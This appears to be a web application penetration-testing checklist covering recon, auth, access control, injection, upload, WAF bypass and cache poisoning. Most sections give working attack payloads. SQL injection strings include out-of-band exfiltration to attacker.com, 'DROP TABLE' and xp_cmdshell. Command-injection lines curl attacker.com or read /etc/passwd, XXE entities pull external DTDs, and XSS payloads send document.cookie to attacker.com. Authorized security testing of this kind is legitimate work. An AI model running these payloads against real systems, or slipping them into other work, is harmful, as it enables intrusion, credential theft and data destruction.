# Web Application VAPT Checklist

---

## 1. Reconnaissance & Enumeration

### 1.1 Passive Recon

#### Network & DNS
- `whois <domain>` — registrar, org, contacts
- `dig <domain> ANY` — A, MX, TXT, CNAME, PTR records
- `dig axfr @<nameserver> <domain>` — DNS zone transfer
- Check if ICMP packets are allowed (ping sweep)

#### Subdomain Enumeration
- `subfinder -d <domain>`
- `amass enum --passive -d <domain>`
- `assetfinder <domain>`
- `theHarvester -d <domain> -b all`

#### Certificate Transparency
- Search `crt.sh` for `%.<domain>`
- Use `certspotter`, `ctsearch` for certificate logs

#### HTTP Headers & Security Config
- `shcheck <url>` — check security headers
- Mozilla HTTP Observatory — header grading
- Check: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, CORS

#### SSL/TLS Analysis
- `testssl.sh <domain>`
- `sslscan <domain>`
- `sslyze <domain>`
- Check: protocol versions (SSLv3, TLS < 1.2), weak ciphers (RC4), HSTS presence, OCSP stapling, cert expiry, chain validity

#### Email Security
- `spoofcheck <domain>` — SPF, DKIM, DMARC policies
- Verify DMARC `p=reject` or `p=quarantine` enforcement

#### Technology Fingerprinting
- Wappalyzer / BuiltWith / WhatWeb — CMS, frameworks, hosting
- Retire.js — outdated/vulnerable JS libraries
- Detect WAF, reverse proxy, IPS

#### OSINT
- Google Dorks: `site:<domain> filetype:pdf`, `intitle:"index of"`, `"<domain>" ext:env OR ext:config`
- GHDB — Google Hacking Database
- `waybackurls <domain>` — archived URLs
- Shodan, Censys, ZoomEye — exposed services and IoT
- `gitrob`, `truffleHog`, `gitleaks` — public repo secrets
- Check LinkedIn, job postings, social profiles for tech stack clues
- Recon-ng / Maltego for OSINT correlation

#### File & Source Code Review
- Review client-side JS for hardcoded secrets, API keys, tokens, private IPs, endpoints
- Check for exposed: `robots.txt`, `sitemap.xml`, `.htaccess`, `<META>` tags, `/.git/`, `/.env/`
- Probe backup/config extensions: `.old`, `.bak`, `.inc`, `.src`, `.swp`, `~`

---

### 1.2 Active Recon

#### Host & Port Discovery
- `nmap -sn <cidr>` — live host discovery (ping sweep)
- `rustscan -a <target>` / `masscan -p1-65535 <target>` — fast port scan
- `nmap -sV -sC -p <ports> <target>` — service + version + default scripts

#### DNS Probing
- `amass enum -active -d <domain>`
- `dnsrecon -d <domain> -t axfr,brt`
- `dnsenum <domain>`
- `fierce -dns <domain>`

#### Subdomain Brute-force
- `sublist3r -d <domain>`
- `amass enum -brute -d <domain> -w <wordlist>`

#### Content Discovery
- **Crawling/URL extraction:**
  - `waybackurls <domain> | tee urls.txt`
  - `gau <domain>`
  - `hakrawler -url <url> -depth 3`
  - `gospider -s <url> -o output`
- **Directory/file brute-force:**
  - `ffuf -u https://<target>/FUZZ -w <wordlist>`
  - `dirsearch -u <url> -e php,html,js,txt,bak`
  - `gobuster dir -u <url> -w <wordlist>`
- **Endpoint & parameter extraction:**
  - `linkfinder -i <url> -o cli`
  - `getJS -url <url>`
  - `SecretFinder -i <url>`
  - `arjun -u <url>` — hidden parameter discovery
  - `paramspider -d <domain>`

#### Manual Browsing Targets
- `/admin`, `/administrator`, `/backoffice`, `/backend`, `/manager/html`
- `/login`, `/wp-admin`, `/phpmyadmin`, `/console`, `/.git`, `/.env`
- Alt ports: 8080 (Tomcat), 8443, 8888, 9090

---

## 2. Authentication Testing

### 2.1 Registration
- Register with duplicate email using variations: uppercase, `+1@`, dots in name, URL encoding
- Attempt to overwrite an existing account (account takeover via re-registration)
- Test weak password policy: `user=password`, `123456`, `qwerty12`, spaces-only password
- Test long passwords (>200 chars) for DoS
- Register without verifying → request password change → check if account activates
- Re-register with same request: same password and different password
- JSON array injection: `{"email":"victim@mail.com","hacker@mail.com","token":"xxx"}`
- Test null byte in email: `my%00email@mail.com`
- XSS in name or email fields
- Race condition on account creation endpoint
- Check OAuth (social login) for `state` parameter presence and validation
- Test redirect after registration/login for open redirect
- Check rate limit on account creation

### 2.2 Login / Credential Testing
- **Username enumeration:** observe different errors for valid vs. invalid username
- **Brute-force:** default creds (`admin/admin`, `test/test`), credential stuffing, password spraying
- `cewl <url> -m 6 -d 3 > wordlist.txt` — generate site-specific wordlist
- Test login over HTTP (if available alongside HTTPS)
- Check account lockout after N failed attempts
- Test "Remember me" token for predictability and expiry
- Test auto-complete on login form (`autocomplete="off"` bypass)
- Lack of re-auth on sensitive actions (email/password/2FA change)
- Test response tampering in SAML authentication
- Test OAuth login for open redirect
- After logout, clear cache, visit `/login?next=accounts/profile` — test open redirect
- Try `/login?next=javascript:alert(1);//` for XSS via redirect
- Check browser cache weakness (Pragma, Expires, Cache-Control: max-age)

### 2.3 Forgot Password / Reset
- Check token uniqueness and entropy
- Test reset link expiry (use after expiration)
- Request 2 reset links → use the older one
- Check for sequential tokens in multiple requests
- `Host: evil.com` / `X-Forwarded-Host: evil.com` injection to redirect reset link
- IDOR in reset link: tamper user ID or email field
- Email crafting: `victim@gmail.com@target.com`
- Carbon copy injection: `email=victim@mail.com%0a%0dcc:hacker@mail.com`
- Append second email param in body
- No TLD in email parameter (e.g., `user@localhost`)
- Token leakage in Referer header
- No rate limit → send 1000+ requests (OTP/link flooding)
- Long password (>200 chars) → DoS on reset
- Response manipulation to bypass reset validation

### 2.4 OTP Testing
- Verify OTP is random and not sequential
- Test OTP reuse after successful login
- Test expired OTP
- Brute-force 6-digit OTP (000000–999999) with Burp Intruder
- Rate limit bypass on OTP endpoint
- OTP replay attack (capture and resend request)
- Verify OTP not exposed in response, logs, or client-side code
- Multiple simultaneous OTP requests (race condition) — check if old OTPs are invalidated
- Response manipulation to bypass OTP check (change `false` → `true`, `0` → `1`)

### 2.5 JWT Testing
- Decode with `jwt.io` / `jwt_tool`
- Test `alg: none` — remove signature entirely
- Change `HS256` → `RS256` with public key as secret
- Weak secret brute-force: `hashcat -a 0 -m 16500 <token> <wordlist>`
- Check token expiry (`exp` claim) — use expired token
- Token reuse after logout
- Bad refresh logic — reuse old refresh token

### 2.6 CAPTCHA Bypass
- Send old/expired CAPTCHA value
- Send old CAPTCHA with old session ID
- Request CAPTCHA absolute path: `www.url.com/captcha/1.png`
- Remove CAPTCHA parameter from request
- Change request method from POST to GET
- Convert JSON request to standard form
- OCR-based solver on simple CAPTCHAs
- Try header injections (`X-Forwarded-For`, `X-Real-IP`)

### 2.7 Session Management
- Decode cookies (Base64, hex, URL) — check for sensitive data
- Check cookie flags: `HttpOnly`, `Secure`, `SameSite`
- Check cookie expiration time
- Test session fixation: inject known session ID before login
- Reuse session cookie after logout (check invalidation)
- Logout → press browser back (Alt+Left arrow) — check if session still active
- 2 browser instances: change password in one, refresh the other — check if old session still works
- Use same cookie from different IP/device
- Test concurrent logins from multiple devices
- Check session binding to IP or User-Agent
- With privileged user, capture cookie → replay with unprivileged user session
- CSRF on state-changing requests (missing/bypassable anti-CSRF token)
- Path traversal in cookie scope

---

## 3. Authorization & Access Control (BAC/IDOR)

### 3.1 Forced Browsing
- Directly access: `/admin`, `/superuser`, `/config`, `/backup`, `/debug`, `/logs`
- Access unlinked/hidden endpoints not visible in navigation

### 3.2 IDOR Exploitation
- Modify `user_id`, `order_id`, `invoice_id`, `file_id` in URL, body, or headers
- Brute-force sequential/predictable IDs: `userId=1`, `userId=2`, etc.
- Horizontal privilege escalation: access another user's data
- Check IDs exposed in JS files, error messages, or URLs
- IDOR in: orders, invoices, tickets, cart, shipment, PDF/print generation, profile picture URL
- Check unsubscribe endpoint for user enumeration via ID

### 3.3 Privilege Escalation
- Modify `role=user` → `role=admin` in request params, cookies, or body
- Access restricted paths as lower-privileged user
- Compare API responses between roles for data leakage
- Check different roles/policy enforcement

### 3.4 BAC Bypass Techniques
- **HTTP Verb Tampering:** change GET → POST, POST → PUT/PATCH/DELETE/OPTIONS
- **Header Manipulation:** add `X-Original-URL: /admin`, `X-Forwarded-For: 127.0.0.1`, `X-HTTP-Method-Override: DELETE`
- **User-Agent / Referer Spoofing:** spoof to bypass header-based access restrictions
- **Workflow Skipping:** access final step (e.g., payment confirmation) without completing prerequisites
- **Parameter Tampering:** modify hidden fields, role flags, or access-control params
- **CSP Bypass:** identify whitelisted domains in CSP → change Host header → resend

---

## 4. Input Validation & Injection

### 4.1 SQL Injection

#### Detection
- Submit `'` → look for SQL syntax errors
- `' AND 1=1--+` (normal) vs `' AND 1=2--+` (different) → injectable
- `' OR 1=1--+` → bypass login
- `' OR 1=1#`
- `'; WAITFOR DELAY '0:0:5'--` / `' AND SLEEP(5)--` → time-based
- `' ORDER BY 1--` ... increment until error → determine column count
- Submit OAST payloads to trigger DNS/HTTP callout

#### Union-Based Extraction
```sql
' ORDER BY N-- -                          -- find column count
' UNION SELECT NULL,NULL,NULL-- -         -- confirm injectable columns
' UNION SELECT 1,2,database()-- -         -- get DB name
' UNION SELECT 1,2,table_name FROM information_schema.tables-- -
' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username,password FROM users-- -
' UNION SELECT username||'~'||password FROM users-- -   -- combine values
```

#### Error-Based
```sql
' AND extractvalue(1,concat(0x7e,database()))-- -          -- MySQL: DB name
' AND updatexml(1,concat(0x7e,version()),1)-- -            -- MySQL: version
' AND 1=convert(int,@@version)-- -                         -- MSSQL
' AND 1=cast(version() as int)-- -                         -- PostgreSQL
' AND 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1))-- -  -- Oracle
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -   -- data via CAST error
```

#### Boolean-Based Blind
```sql
' AND 1=1-- -                                                     -- true
' AND 1=2-- -                                                     -- false
' AND (SELECT 'a' FROM users LIMIT 1)='a                          -- confirm table exists
' AND (SELECT 'a' FROM users WHERE username='administrator')='a   -- confirm user
' AND LENGTH((SELECT password FROM users WHERE username='administrator'))>1-- -
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a-- -
```

#### Time-Based Blind
```sql
-- MySQL
' AND IF(1=1, SLEEP(5), 0)-- -
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
'; IF (SELECT SUBSTRING(db_name(),1,1))='a' WAITFOR DELAY '0:0:5'-- -
-- PostgreSQL
' AND (SELECT pg_sleep(5))-- -
' AND CASE WHEN SUBSTRING(current_database(),1,1)='a' THEN pg_sleep(5) ELSE 0 END-- -
-- Oracle
' AND (SELECT dbms_pipe.receive_message('x',5) FROM dual) IS NULL-- -
```

#### Out-of-Band (OOB)
```sql
-- MySQL
' AND LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\x'))-- -
-- MSSQL
'; DECLARE @h varchar(8000); SET @h='\\attacker.com\share\'+db_name()+'.txt'; EXEC master..xp_dirtree @h-- -
-- Oracle
' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1))=1-- -
```

#### Stacked Queries
```sql
'; DROP TABLE users-- -
'; EXEC xp_cmdshell 'dir'-- -                              -- MSSQL RCE
'; INSERT INTO users VALUES('hacker','pass')-- -
'; SELECT * FROM users INTO OUTFILE '/tmp/out.txt'-- -     -- MySQL file write
```

#### SQLMap Commands
```bash
sqlmap -u "http://target.com/page?id=1" --batch
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns
sqlmap -u "http://target.com/page?id=1" -D dbname -T users -C user,pass --dump
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --dump
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --os-shell
# With saved Burp request:
sqlmap -r request.txt --batch --dbs
```

---

### 4.2 Cross-Site Scripting (XSS)

#### Reflected XSS
- Submit alphanumeric probe → identify reflection context → craft payload
- Inspect and review JS/jQuery for input validation
- Use Burp Intruder with allowed HTML tags/events wordlist

```html
<script>alert(1)</script>
javascript:alert(1)
`${alert(1)}`
<svg><animatetransform onbegin=alert(1)></svg>
\"-alert(1)}//
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
%22%3E%3Cimg%20src=x%20onerror=prompt(1);%3E
<link rel="canonical" href="https://test.com/?" accesskey="x" onclick="alert(1)">
<svg><a><animate attributeName="href" values="javascript:alert(1)"></animate><text x="20" y="20">Click</text></a></svg>
<!-- AngularJS -->
[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x
```

#### DOM-Based XSS
- Inject into: `location`, `document.URL`, `document.location`, `document.referrer`
- Manipulate query/hash params: `#?name=<img src=x onerror=alert(1)>`
- Test `URLSearchParams` usage in JS
```html
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<!-- AngularJS sandbox -->
{{constructor.constructor('alert(1)')()}}
```

#### Stored XSS
- Inject into: comments, user bio/name, profile picture filename, posts, addresses
- Use custom tags to bypass WAFs
```html
<script>alert('stored')</script>
<img src=x onerror=alert('stored')>
<a href="#" onclick="alert('stored')">Click</a>
<svg/onload=alert('stored')>
http://foo?&apos;-alert(1)-&apos;
```

---

### 4.3 OS Command Injection

#### Separators (cross-platform)
```
&   &&   |   ||
```

#### Separators (Unix only)
```
;   \n (0x0A)
`injected_command`
$(injected_command)
```

#### Test Payloads
```bash
; whoami
| id
& ping -c 5 attacker.com
; curl http://attacker.com/$(whoami)
; cat /etc/passwd
$(sleep 5)
`sleep 5`
; nslookup attacker.com
```

---

### 4.4 XXE (XML External Entity)
- Change `Content-Type` to `text/xml` or `application/xml`
- Test in file uploads, XML APIs, SOAP endpoints

```xml
<!-- Basic XXE: read local file -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>

<!-- SSRF via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-service/">]>

<!-- OOB XXE: DNS exfiltration -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?data=">]>

<!-- Blind XXE via error -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
```

---

### 4.5 SSRF (Server-Side Request Forgery)
- Test in: image fetchers, webhooks, PDF generators, URL preview features, import-by-URL
- Try internal addresses: `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254` (AWS metadata)
- Test discovered internal open ports

```
http://169.254.169.254/latest/meta-data/
http://127.0.0.1:8080/admin
http://internal-host:3306
dict://127.0.0.1:11211/stats   (Memcached)
file:///etc/passwd
gopher://127.0.0.1:6379/_*1%0d%0a...  (Redis)
```

---

### 4.6 SSTI (Server-Side Template Injection)
- Test in: name fields, error messages, URL parameters

```
{{7*7}}           → 49 (Jinja2/Twig)
${7*7}            → 49 (Freemarker)
<%= 7*7 %>        → 49 (ERB)
{{7*'7'}}         → 7777777 (Jinja2)
#{7*7}            → 49 (Ruby)
*{7*7}            → 49 (Spring)
{{config}}        → dump Flask config (Jinja2)
{{''.__class__.__mro__[1].__subclasses__()}}   → enumerate Python classes
```

---

### 4.7 Other Injections

#### NoSQL Injection
```
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}}
username[$ne]=invalid&password[$ne]=invalid
```

#### LDAP Injection
```
*)(uid=*))(|(uid=*
admin)(&)
```

#### XPath Injection
```
' or '1'='1
' or ''='
x' or name()='username' or 'x'='y
```

#### SMTP Injection (headers)
```
victim@mail.com%0aCC:hacker@mail.com
victim@mail.com%0aBcc:attacker@example.com
```

#### HTTP Header Injection
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: attacker.com
X-Original-URL: /admin
```

#### HTML Injection
```html
<h1>Injected</h1>
<iframe src="http://attacker.com"></iframe>
```

---

### 4.8 Open Redirect
- Test `?next=`, `?url=`, `?redirect=`, `?return=`, `?to=` parameters
```
/login?next=https://attacker.com
/login?next=//attacker.com
/login?next=javascript:alert(1)
/login?next=%2F%2Fattacker.com
```

---

### 4.9 HTTP Request Smuggling
- Test with `Content-Length` and `Transfer-Encoding` desync
- CL.TE, TE.CL, TE.TE variants
- Tool: `smuggler.py`, Burp HTTP Request Smuggler extension

---

### 4.10 Path Traversal / LFI / RFI
```
../../../../etc/passwd
..%2F..%2F..%2Fetc/passwd
..%252F..%252Fetc/passwd    (double-encoded)
..\\..\\etc\\passwd
/etc/passwd%00.jpg          (null byte)
php://filter/convert.base64-encode/resource=index.php
http://attacker.com/shell.txt  (RFI)
```

---

### 4.11 Insecure Deserialization
- Identify serialized data in cookies, hidden fields, API payloads (Java, PHP, Python pickle)
- Tools: `ysoserial` (Java), `phpggc` (PHP)
- Check for `__wakeup`, `__destruct`, `readObject` vulnerabilities

---

## 5. File Upload Testing

### 5.1 File Type Bypass
- Upload `.php`, `.php.jpg`, `.phtml`, `.php5`, `.pHp` (case variation)
- Double extension: `shell.php.jpg`, `malware.png.php`
- Rename `.exe` → `.jpg` and upload
- Change `Content-Type: image/png` while uploading PHP file
- Upload polyglot file (valid image + embedded script)
- Magic bytes: prepend `GIF89a` to PHP payload

### 5.2 Stored XSS via Upload
- Filename: `<script>alert(1)</script>.jpg`
- Inject into EXIF metadata: JS, SQL, HTML payloads
- SQL injection payload in filename
- Path traversal in filename: `../../evil.php`

### 5.3 Resource Handling
- Upload oversized file (beyond limit) — DoS attempt
- Upload 0-byte file
- Upload 20000×20000 pixel image — check image processing crash
- Concurrent large file uploads — check server stability
- Slow upload (Slowloris) — check server timeout handling

### 5.4 Access Control
- Direct access to uploaded file: `/uploads/shell.php`
- IDOR: access another user's file by changing ID/path in URL
- Check if previously uploaded file can be overwritten
- Verify `Content-Disposition: attachment` to prevent inline execution
- Check `X-Content-Type-Options: nosniff`

### 5.5 Execution
- Upload `shell.php.jpg` → request via direct URL → check execution
- Upload EICAR test file → check AV/malware scanning response
- Webshell upload and execution test

### 5.6 Transport & Logic
- Verify HTTPS enforced during upload
- Tamper multipart boundary in Burp
- Check rate limiting on upload endpoint
- Verify server-side (not just client-side) validation
- Test upload bypass via alternate API/mobile endpoints

---

## 6. Business Logic Testing

### 6.1 Application Logic
- Tamper `product_id`, `price`, `quantity` in add/modify/pay/delete actions
- Tamper or reuse gift/discount/coupon codes
- Parameter pollution to use coupon twice: `coupon=CODE&coupon=CODE`
- Check if CVV and card number are masked in payment forms
- Use test credit card: `4111 1111 1111 1111`
- IDOR in: tickets, cart, shipment, PDF/print generation
- Check unsubscribe button for user enumeration
- Parameter pollution on social media sharing links
- Change POST to GET for sensitive requests
- Reuse token, skip steps, act as another user, change action order

### 6.2 Business Logic Flaws
- Cart manipulation, order tampering, coupon stacking
- Payment flow bypass: skip payment step, go direct to confirmation
- Refund manipulation via out-of-order workflow steps
- Race condition: simultaneously redeem multiple coupon/gift codes
- Unlimited redemption of single-use resources

### 6.3 Rate Limiting Tests
- No rate limit on login → brute-force attempt
- No rate limit on password reset → OTP/link flooding
- Bypass via: `X-Forwarded-For: <different_IP>`, `X-Real-IP` header spoofing
- Bypass via IP rotation, multiple accounts, session resets
- Burst/parallel requests to exploit race condition
- Test alternative endpoints: `/api/v1/login` vs `/api/v2/login` vs mobile API

---

## 7. Profile & Account Management

- Tamper `user_id` param → access other users' details
- Change email to existing email — check server-side validation
- Check new email confirmation link flow (what if user doesn't confirm?)
- Check profile picture URL for embedded user info or EXIF geolocation
- Imagetragick in profile picture upload (ImageMagick exploit)
- Check metadata of downloadable files (geolocation, usernames)
- Account deletion → try to reactivate via Forgot Password
- Brute-force/enumerate when changing unique user parameters
- Check re-authentication requirement for sensitive operations
- Parameter pollution: add two values for same field
- CSRF on: email update, password change, 2FA enrollment, account deletion
- CSV import: command injection, XSS, macro injection payloads

---

## 8. Client-Side Testing

- Check `localStorage`, `sessionStorage`, `indexedDB`, cookies for sensitive data
- CORS: test `Origin: attacker.com` → check `Access-Control-Allow-Origin: *` or reflection
- CSP: check for `unsafe-inline`, `unsafe-eval`, wildcard sources
- SRI: check third-party scripts for missing `integrity` attribute
- DOM-based vulnerabilities: inspect `innerHTML`, `document.write`, `eval` sinks
- Source map exposure: check for `.map` files in production (`app.js.map`)
- Debug endpoints: `/debug`, `/test`, `/__webpack_hmr`, `/actuator`
- Broken link hijacking: `blc <url>` — find broken outbound links
- Client-side logic manipulation: bypass JS-only validation via Burp

---

## 9. Infrastructure & Error Handling

### 9.1 Error Handling
- Access fake pages: `/whatever_fake.php`, `/fake.aspx`
- Add `{}`, `[]`, `[` in cookie and parameter values to trigger errors
- Append `/~randomthing/%s` to URLs
- Use Burp Intruder "Fuzzing Full" list against input fields
- Try invalid HTTP verbs: `PATCH`, `DEBUG`, `FAKE`, `FOO`
- Input data exceeding size limit

### 9.2 Infrastructure
- Check for dangerous HTTP methods: `OPTIONS`, `PUT`, `DELETE`, `TRACE`
- `xmlrpc.php` — check for DoS and user enumeration
- Virtual hosting misconfiguration: `VHostScan`
- Check internal numeric IPs in requests (SSRF exposure)
- Test cloud storage: open S3 buckets, public GCS, exposed SAS tokens
- Check for alternate channels: `www.site.com` vs `m.site.com` vs API subdomain
- Segregation in shared/ASP-hosted infrastructure

---

## 10. WAF Bypass Techniques

### Encoding
| Technique | Example |
|-----------|---------|
| URL encoding | `<script>` → `%3Cscript%3E` |
| Double URL encoding | `'` → `%2527` |
| Base64 (API params) | `admin' OR '1'='1` → base64 encoded |
| HTML entities | `<script>` → `&lt;script&gt;` |
| Unicode tricks | `UNION` → `\u0055NION` |

### SQL WAF Bypass
```sql
' aNd 1=1-- -               -- case variation
'/**/AND/**/1=1-- -          -- comments to split
'/*!50000AND*/ 1=1-- -       -- MySQL version comments
' AND 'a'='a'                -- concatenation
uNiOn SeLeCt                 -- mixed case
se/**/lect                   -- comment splitting
```

### Other Bypass Techniques
- **HTTP Parameter Pollution:** `?id=1&id=2` — WAF reads first, backend uses second
- **Alternate HTTP Methods:** PUT, DELETE, PATCH, OPTIONS may skip WAF rules
- **Host Header Manipulation:** `X-Forwarded-Host: alternate-domain.com`
- **Request Smuggling / Desync:** exploit CL vs TE parsing differences between proxy and backend
- **Fragmentation:** split payloads across TCP packets (`<scri` + `pt>`)
- **Path Traversal Variants:** `..%2F`, `..%252F`, `..\\`
- **Whitespace alternatives:** `%09` (tab), `%0a` (newline), `%0d%0a` (CRLF)

---

## 11. Web Cache Poisoning

### Attack Vectors
- **Host Header Injection:** set `X-Forwarded-Host: attacker.com` — check if reflected in cached response
- **Unkeyed parameters:** inject `?evil=<payload>` — if `evil` not in cache key but reflected in response → poisoned
- **Vary header abuse:** app varies on `User-Agent` but cache ignores it → inject payload via User-Agent
- **HTTP Method Confusion:** GET with malicious headers, app uses them, cache stores poisoned response
- **Encoding tricks:** `/%2e%2e/admin` → cache treats as static, backend resolves to admin panel
- **Cookie bombing:** inject cookies that affect response but are ignored by cache key
- **Cache-Control abuse:** force `public, max-age=600` on sensitive responses
- **Open redirect poisoning:** cache redirect responses containing attacker-controlled URLs

### Test Steps
1. Identify cache keys (remove params one-by-one, check `X-Cache: HIT`)
2. Find unkeyed inputs (headers, params not in cache key but reflected in response)
3. Inject payload into unkeyed input → request twice → verify second response is cached
4. Confirm poisoning serves payload to other users (use Burp Collaborator)

---

## 12. XSS Payload Quick Reference

```html
<!-- Basic -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">

<!-- Event-based -->
<input onfocus=alert(1) autofocus>
<select onchange=alert(1)><option>1</option></select>
<details open ontoggle=alert(1)>

<!-- Bypass filters -->
<ScRiPt>alert(1)</sCrIpT>
<script>ale\u0072t(1)</script>
<img src=1 onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<svg><script>alert&#40;1&#41;</script></svg>
jaVaScRiPt:alert(1)

<!-- Exfiltration -->
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

---

## 13. Quick Reference: Key Tools

| Category | Tools |
|----------|-------|
| Recon | subfinder, amass, assetfinder, theHarvester, whois, dig |
| SSL/TLS | testssl.sh, sslscan, sslyze |
| Crawling | waybackurls, gau, hakrawler, gospider |
| Dir/File Enum | ffuf, dirsearch, gobuster, dirb |
| Param Discovery | arjun, paramspider |
| SQLi | sqlmap, Burp Intruder |
| XSS | Burp, kxss, dalfox |
| JWT | jwt.io, jwt_tool, hashcat |
| Proxy / Intercept | Burp Suite, OWASP ZAP |
| OSINT | Shodan, Censys, gitrob, truffleHog, gitleaks |
| Cloud | awscli (S3 enum), gcpcli |
| Secrets Scan | truffleHog, gitleaks, git-secrets |
